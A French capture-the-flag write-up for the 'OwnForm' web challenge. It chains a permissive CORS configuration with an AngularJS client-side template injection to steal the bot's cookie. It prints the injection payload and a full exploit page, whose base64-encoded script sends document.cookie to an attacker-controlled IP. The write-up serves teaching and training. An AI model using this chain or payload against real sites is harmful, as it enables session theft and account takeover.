# OwnForm

## Solve

Dans ce challenge, il y a un simple formulaire, ou on peut indiquer nos informations, et les envoyer au serveur, néanmoins, si l'on prête attention aux sources du challenge, on remarque ceci dans le seveur :

```js
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Cookie');
    res.header('Access-Control-Allow-Credentials', true);
    next();
});
```

Ici, les CORS sont trop permissives, cela veut dire que l'on peut envoyer une requete POST au serveur depuis une autre origine (en utilisant fetch/XMLHttpRequest) et qu'elle sera acceptée.

De plus, lorsqu'on envoi un formulaire, beaucoup d'erreurs sont gérées, notamment celle lorsqu'un département n'existe pas :

```js
req.session.error = "Le département " + req.body.departement + " n'existe pas.";
```

On controle donc ici le département, mais si l'on injecte `<img src=x>`, on voit que cela est affiché (littéralement) sur le site web.

En effet, dans le frontend, on remarque l'utilisation de AngularJS, qui sanitize automatiquement le DOM. Néanmoins, notre input est refléchie comme ceci :

```html
[...]
<div class="container" ng-controller="FormController">
    <p><%= data?.error %></p>
    <p><%= data?.success %></p>
    <h2>Remplir le formulaire</h2>
</div>
[...]
```

Ici, il est possible d'exploiter une CSTI (Client Side Template Injection), on peut prendre une payload assez classique pour exécuter du javascript :

```js
{{constructor.constructor('alert(1)')()}}
```

On va donc chercher ici à voler le cookie du bot qui visitera notre page.

Il y a un problème, c'est que la XSS est le résultat d'une requête POST, et qu'elle est réfléchie après, on va donc aussi utiliser l'abus des CORS pour exploiter cela :

```html
<iframe id="iframe" src="https://localhost/"></iframe>
<script>
    $("iframe").ready(function() {
        const formData = new URLSearchParams();
        formData.append('email', 'a@a.fr');
        formData.append('nom', 'a');
        formData.append('prenom', 'a');
        formData.append('departement', '{{constructor.constructor("eval(atob(\'d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly8xMC41MC4yLjc3OjMwMDAyLz9kYXRhPScrYnRvYShkb2N1bWVudC5jb29raWUp\'))")()}}');
        fetch("https://localhost/submit-form", {
        method: "POST",
        redirect: "manual", //fetch follow 302 redirects, must be set to manual to execute the XSS
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: formData,
        credentials: "include" //include is required here for firefox/chrome/... to send the cookie
        })
        .then(response => {
            document.location.href = "https://localhost/";
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
    });
</script>
```

Ici, on ouvre une `iframe` avant car dans le code on remarque que si l'on a pas visité la page en GET, alors le serveur, au moment d'une requête POST, répondra "Requête invalide".

Vous trouverez le serveur web permettant d'héberger l'exploit dans `script/`.

On l'envoi au bot et on récupère le flag !

## Flag

BZHCTF{s3lf_xss_c4n_b3_3xpl0it4bl3}